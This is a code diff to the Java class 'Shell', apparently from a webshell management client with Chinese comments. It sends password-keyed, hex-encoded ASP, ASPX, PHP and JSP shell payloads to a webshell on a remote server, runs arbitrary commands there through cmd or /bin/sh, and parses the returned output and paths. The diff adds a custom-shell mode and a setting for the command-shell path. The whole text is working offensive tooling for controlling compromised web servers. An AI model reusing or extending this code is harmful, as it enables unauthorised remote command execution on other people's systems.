@@ -20,11 +20,12 @@ public class Shell {
 	private String code = "";
 	private int type = 0;
 	private String url = "";
-
+	private String z1 = null;  //cmd 路径
+	private String z2 = null;  //cmd 命令
+	private String cus_z1 = "";//自定义cmd路径
 	public Shell(int os, String url, String code, int type) {
 		// TODO Auto-generated constructor stub
 		this.url = url;
-		// this.pa = pa;
 		this.os = os;
 		// Safe.PASS = pass; //初始化密码
 		this.code = code;
@@ -53,6 +54,9 @@ public class Shell {
 			case 3:
 				result = execute_aspx(command);
 				break;
+			case 4:
+				result = execute_cus(command);
+				break;
 			}
 		} catch (Exception e) {
 			pa = path_bak;
@@ -68,8 +72,7 @@ public class Shell {
 	private String[] execute_asp(String command) {
 
 		String re[] = new String[2];
-		String z1 = null;
-		String z2 = null;
+		
 
 		switch (os) {
 
@@ -84,14 +87,14 @@ public class Shell {
 		default:
 			break;
 		}
-
+		z1 = CheckCMDPath(z1);
 		z2 = z2.replace("\n", "");
 		z2 = z2.replace("\r", "");
 
 		String tmp = "";
 		z1 = toHexString(z1);
 		z2 = toHexString(z2);
-		tmp = z1 + "&z2=" + z2;
+		tmp = z1 + "&"+Safe.PARAM2+"=" + z2;
 		String payload = Safe.ASP_SHELL.replace("PARAM1", Safe.PARAM1).replace("PARAM2", Safe.PARAM2);
 		String make = Safe.ASP_MAKE.replace("PAYLOAD", toHexString(payload));
 		String params = Safe.PASS + "=" + make + "&" + Safe.PARAM1 + "=" + tmp;
@@ -105,6 +108,7 @@ public class Shell {
 		} catch (Exception e) {
 
 		}
+		//System.out.println(params);
 		return re;
 	}
 
@@ -112,8 +116,8 @@ public class Shell {
 	private String[] execute_aspx(String command) {
 
 		String re[] = new String[2];
-		String z1 = null;
-		String z2 = null;
+//		String z1 = null;
+//		String z2 = null;
 		String tmp = "";
 		String aspx_shell = Safe.ASPX_SHELL.replace("PARAM1", Safe.PARAM1).replace("PARAM2", Safe.PARAM2);
 		String make = Safe.ASPX_MAKE.replace("PAYLOAD", aspx_shell);
@@ -132,6 +136,7 @@ public class Shell {
 		default:
 			break;
 		}
+		z1 = CheckCMDPath(z1);
 		z2 = z2.replace("\n", "");
 		z2 = z2.replace("\r", "");
 		try {
@@ -144,19 +149,18 @@ public class Shell {
 		String[] index_datas = Common.send(url, params, code).split("\t");
 		re[0] = Arrays.toString(index_datas);
 		re[0] = re[0].substring(re[0].indexOf("[") + 1, re[0].indexOf("[S]"));
-
 		String path = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf("[S]") + 3,
 				Arrays.toString(index_datas).indexOf("[E]"));
 		re[1] = path;
 		return re;
 
 	}
-
+	
 	// php 命令执行
 	private String[] execute_php(String command) {
 		String re[] = new String[2];
-		String z1 = null;
-		String z2 = null;
+		//String z1 = null;
+		//String z2 = null;
 		String tmp = null;
 		String params = null;
 		switch (os) {
@@ -171,6 +175,8 @@ public class Shell {
 		default:
 			break;
 		}
+		z1 = CheckCMDPath(z1);
+		
 		z2 = z2.replace("\n", "");
 		z2 = z2.replace("\r", "");
 		byte[] z12 = null;
@@ -196,24 +202,29 @@ public class Shell {
 	// jsp 命令执行
 	private String[] execute_jsp(String command) {
 		String re[] = new String[2];
-		String z1 = null;
-		String z2 = null;
+//		String z1 = null;
+//		String z2 = null;
 		String tmp = null;
 		String params = null;
 		switch (os) {
-
 		case 1:
 			z1 = "/ccmd";
+			z1 = CheckCMDPath(z1);
+			if(!z1.equals("/ccmd"))
+			{z1="/c"+z1;}
 			z2 = "cd" + " " + "/d " + "\"" + pa + "\"&" + command + "&echo [S]&cd&echo [E]";
 			break;
 		case 2:
 			z1 = "-c/bin/sh";
+			z1 = CheckCMDPath(z1);
+			if(!z1.equals("-c/bin/sh"))
+			{z1="/c"+z1;}
 			z2 = "cd" + " " + "\"" + pa + "\";" + command + ";echo [S];pwd;echo [E]";
 			break;
 		default:
 			break;
 		}
-
+		
 		z2 = z2.replace("\n", "");
 		z2 = z2.replace("\r", "");
 		byte[] z12 = null;
@@ -238,11 +249,65 @@ public class Shell {
 		String result = null;
 		result = Arrays.toString(index_datas);
 		re[0] = result.substring(result.indexOf("[") + 1, result.indexOf("[S]"));
+		if(result.indexOf("[E]")+3<(result.length()-1))
+		{
+		String erroroutput = result.substring(result.indexOf("[E]") + 3, (result.length()-1));
+		re[0] = re[0] + erroroutput;
+		}
 		re[1] = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf("[S]") + 3,
 				Arrays.toString(index_datas).indexOf("[E]"));
 		return re;
 	}
+	private String[] execute_cus(String command) {
+		String re[] = new String[2];
 
+		String tmp = null;
+		String params = null;
+		switch (os) {
+		case 1:
+			z1 = "cmd";
+			//z2 = "cd" + " " + "/d " + "\"" + pa + "\"&" + command + "&echo [S]&cd&echo [E]";
+			break;
+		case 2:
+			z1 = "/bin/sh";
+			//z2 = "cd" + " " + "\"" + pa + "\";" + command + ";echo [S];pwd;echo [E]";
+			break;
+		default:
+			break;
+		}
+		z1 = CheckCMDPath(z1);
+		z2 = command;
+		z2 = z2.replace("\n", "");
+		z2 = z2.replace("\r", "");
+		//params = Common.makeParams(Safe.CUS_MAKE, Safe.CUS_SHELL,URLEncoder.encode(z1),URLEncoder.encode(z2),URLEncoder.encode(pa));
+		params = Safe.PASS+"=1&"+Safe.ACTION+"="+Safe.CUS_SHELL+"&"+Safe.PARAM1+"="+URLEncoder.encode(z1)+"&"+Safe.PARAM2+"="
+		+URLEncoder.encode(z2)+"&"+Safe.PARAM3+"="+URLEncoder.encode(pa);
+		String[] index_datas = Common.send(url, params, code).split("\t");
+		String result = Arrays.toString(index_datas);
+		String spl = Safe.CUS_SHELL_SPL;
+		String spr = Safe.CUS_SHELL_SPR;
+		re[0] = result.substring(result.indexOf("[") + 1, result.indexOf(spl));
+		re[1] = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf(spl) + spl.length(),
+				Arrays.toString(index_datas).indexOf(spr));
+		return re;
+	}
+	
+	
+	
+	public void SetCMD(String cmdpath)
+	{
+		cus_z1 = cmdpath;
+	}
+	public String CheckCMDPath(String z) //检查cmd是否有自定义路径
+	{
+		if(cus_z1.equals(""))
+		{
+			return z;
+		}else
+		{
+			return cus_z1;
+		}
+	}
 	public String GetPath() {
 		String path = "";
 		String path_index = "";
@@ -270,6 +335,10 @@ public class Shell {
 					e.printStackTrace();
 				}
 				break;
+			case 4: //cus模式
+				//path_index = Common.makeParams(Safe.CUS_MAKE, Safe.CUS_INDEX);			
+				params = Safe.PASS + "=1&action="+Safe.CUS_SHELL+"&"+Safe.PARAM1+"="+"&"+Safe.PARAM2+"=";
+				break; 
 			}
 
 		} catch (Exception e) {
@@ -278,7 +347,6 @@ public class Shell {
 		String[] index_datas = Common.send(url, params, code).split("\t");
 		String webroot = index_datas[0];
 		pa = webroot;
-		System.out.println(pa);
 		if (webroot.contains(":")) // windows系统
 		{
 			Safe.SYSTEMSP = "\\";
@@ -289,8 +357,9 @@ public class Shell {
 			{
 				pa = pa.replace("/", "\\");
 			}
-			pa = pa +">";
+			//pa = pa +"";
 			os = 1;
+			z1 = "cmd"; //设置cmd初始化路径
 		} else // linux系统
 		{
 
@@ -300,8 +369,9 @@ public class Shell {
 				pa = pa + "/";
 			}
 			pa = pa.replace("\t", "");
-			pa = "["+pa+"]$";
+			//pa = "["+pa+"]$";
 			os = 2;
+			z1 = "/bin/sh";  //设置cmd初始化路径
 		}
 		SimpleAttributeSet a = new SimpleAttributeSet();
 		StyleConstants.setForeground(a, Color.WHITE);
